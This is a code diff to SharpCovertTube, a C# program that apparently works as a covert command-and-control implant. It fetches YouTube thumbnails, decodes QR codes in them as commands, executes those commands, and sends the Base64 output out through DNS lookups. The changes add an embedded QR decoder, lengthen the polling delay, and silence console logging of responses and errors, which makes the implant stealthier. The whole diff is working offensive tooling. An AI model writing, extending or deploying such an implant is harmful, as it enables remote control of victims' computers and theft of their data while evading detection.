@@ -1,12 +1,13 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Drawing;
 using System.IO;
-using System.Linq;
 using System.Net;
-using System.Security.Cryptography;
-using ZXing;
+using System.Linq;
+using System.Text;
+using System.Drawing;
+using System.Diagnostics;
+using System.Collections.Generic;
+using SharpCovertTube.QRCodeDecoder;
+
 
 namespace SharpCovertTube
 {
@@ -16,7 +17,42 @@ namespace SharpCovertTube
         public const string channel_id = "";
         public const string api_key = "";
         public const string dns_hostname = ".test.org";
-        public const int seconds_delay = 60;
+        public const int seconds_delay = 120;
+
+
+        static string ByteArrayToStr(byte[] DataArray)
+        {
+            Decoder decoder = Encoding.UTF8.GetDecoder();
+            int CharCount = decoder.GetCharCount(DataArray, 0, DataArray.Length);
+            char[] CharArray = new char[CharCount];
+            decoder.GetChars(DataArray, 0, DataArray.Length, CharArray, 0);
+            return new string(CharArray);
+        }
+
+
+        // Source: https://github.com/Stefangansevles/QR-Capture
+        static string DecodeQR(Bitmap QRCodeInputImage)
+        {
+            QRDecoder decoder = new QRDecoder();
+            byte[][] DataByteArray = decoder.ImageDecoder(QRCodeInputImage);
+            if (DataByteArray == null)
+            {
+                return "";
+            }
+            string code = ByteArrayToStr(DataByteArray[0]);
+            return code;
+        }
+
+        
+        static string ReadQR(string thumbnail_url)
+        {
+            var client = new WebClient();
+            var stream = client.OpenRead(thumbnail_url);
+            if (stream == null) return "";
+            Bitmap bitmap = new Bitmap(stream);
+            string decoded_cmd = DecodeQR(bitmap);
+            return decoded_cmd;
+        }
 
 
         public static string Base64Encode(string plainText)
@@ -25,19 +61,6 @@ namespace SharpCovertTube
             return System.Convert.ToBase64String(plainTextBytes);
         }
 
-
-        // Source: https://blog.dotnetframework.org/2020/02/26/read-a-qr-code-in-c-using-the-zxing-net-library/
-        static string ReadQR(string thumbnail_url)
-        {
-            var client = new WebClient();
-            var stream = client.OpenRead(thumbnail_url);
-            if (stream == null) return "";
-            var bitmap = new Bitmap(stream);
-            IBarcodeReader reader = new BarcodeReader();
-            var result = reader.Decode(bitmap);
-            string decoded_cmd = result.Text;
-            return decoded_cmd;
-        }
 
         // Source: MSDN
         static string ExecuteCommand(string command)
@@ -61,8 +84,10 @@ namespace SharpCovertTube
         static void DNSExfil(string response_cmd) {
             // Base64
             string base64_response_cmd = Base64Encode(response_cmd);
-            Console.WriteLine("[+] Base64 response:\t{0}", base64_response_cmd);
-
+            Console.WriteLine("[+] Base64-encoded response:\t{0}", base64_response_cmd);
+            if (base64_response_cmd == "") {
+                base64_response_cmd = "bnVsbC1hbnN3ZXI";
+            }
             // DNS lookup
             try
             {
@@ -74,7 +99,7 @@ namespace SharpCovertTube
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Exception: {0}", e.ToString());
+                // Console.WriteLine("[-] Exception: {0}", e.ToString());
             }
         }
 
@@ -90,7 +115,7 @@ namespace SharpCovertTube
             
             // Execute command
             string response_cmd = ExecuteCommand(decoded_cmd);
-            Console.WriteLine("[+] Response from command:\t{0}", response_cmd);
+            // Console.WriteLine("[+] Response from command:\t{0}", response_cmd);
 
             // Exfiltrate
             DNSExfil(response_cmd);
@@ -134,9 +159,10 @@ namespace SharpCovertTube
             // Initial videos
             List<string> Initial_VideoIds = GetVideoIds(channel_url);
             int number_of_videos = Initial_VideoIds.Count;
+            Console.WriteLine("[+] Videos already uploaded:");
             foreach (string value in Initial_VideoIds)
             {
-                Console.WriteLine("[+] ID: \t{0}", value);
+                Console.WriteLine("[+] Video with ID: \t{0}", value);
             }
 
             while (true)
